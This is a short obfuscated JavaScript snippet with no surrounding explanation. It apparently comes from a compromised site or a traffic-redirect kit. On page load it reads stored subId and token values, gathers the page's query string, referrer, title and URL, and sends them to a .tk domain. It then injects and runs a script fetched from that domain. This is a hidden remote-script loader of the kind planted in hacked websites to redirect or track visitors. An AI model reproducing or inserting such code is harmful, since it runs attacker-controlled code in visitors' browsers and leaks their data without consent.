(function() {
    var name = '_SjZvqMxRFM9xLBf7';
    if (!window._SjZvqMxRFM9xLBf7) {
        window._SjZvqMxRFM9xLBf7 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://inadsaucutim.tk/CfvkQ3',
            P_PATH: 'https://inadsaucutim.tk/fec84ce/postback',
        };
    }
    const _YDXdLQSb7z2wCqD3 = localStorage.getItem('config');
    if (typeof _YDXdLQSb7z2wCqD3 !== 'undefined' && _YDXdLQSb7z2wCqD3 !== null) {
        var _8hr4BD81jxPB3t4B = JSON.parse(_YDXdLQSb7z2wCqD3);
        var _SGCtGtfk6wYtKp2G = Math.round(+new Date()/1000);
        if (_8hr4BD81jxPB3t4B.created_at + window._SjZvqMxRFM9xLBf7.ttl < _SGCtGtfk6wYtKp2G) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _46LWzPC1VMQLdm91 = localStorage.getItem('subId');
    var _SY1hqXKW4mFPMN4F = localStorage.getItem('token');
    var _JjPvJ9GfTWvmGTYf = '?return=js.client';
        _JjPvJ9GfTWvmGTYf += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _JjPvJ9GfTWvmGTYf += '&se_referrer=' + encodeURIComponent(document.referrer);
        _JjPvJ9GfTWvmGTYf += '&default_keyword=' + encodeURIComponent(document.title);
        _JjPvJ9GfTWvmGTYf += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _JjPvJ9GfTWvmGTYf += '&name=' + encodeURIComponent(name);
        _JjPvJ9GfTWvmGTYf += '&host=' + encodeURIComponent(window._SjZvqMxRFM9xLBf7.R_PATH);
    if (typeof _46LWzPC1VMQLdm91 !== 'undefined' && _46LWzPC1VMQLdm91 && window._SjZvqMxRFM9xLBf7.unique) {
        _JjPvJ9GfTWvmGTYf += '&sub_id=' + encodeURIComponent(_46LWzPC1VMQLdm91);
    }
    if (typeof _SY1hqXKW4mFPMN4F !== 'undefined' && _SY1hqXKW4mFPMN4F && window._SjZvqMxRFM9xLBf7.unique) {
        _JjPvJ9GfTWvmGTYf += '&token=' + encodeURIComponent(_SY1hqXKW4mFPMN4F);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._SjZvqMxRFM9xLBf7.R_PATH + _JjPvJ9GfTWvmGTYf;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
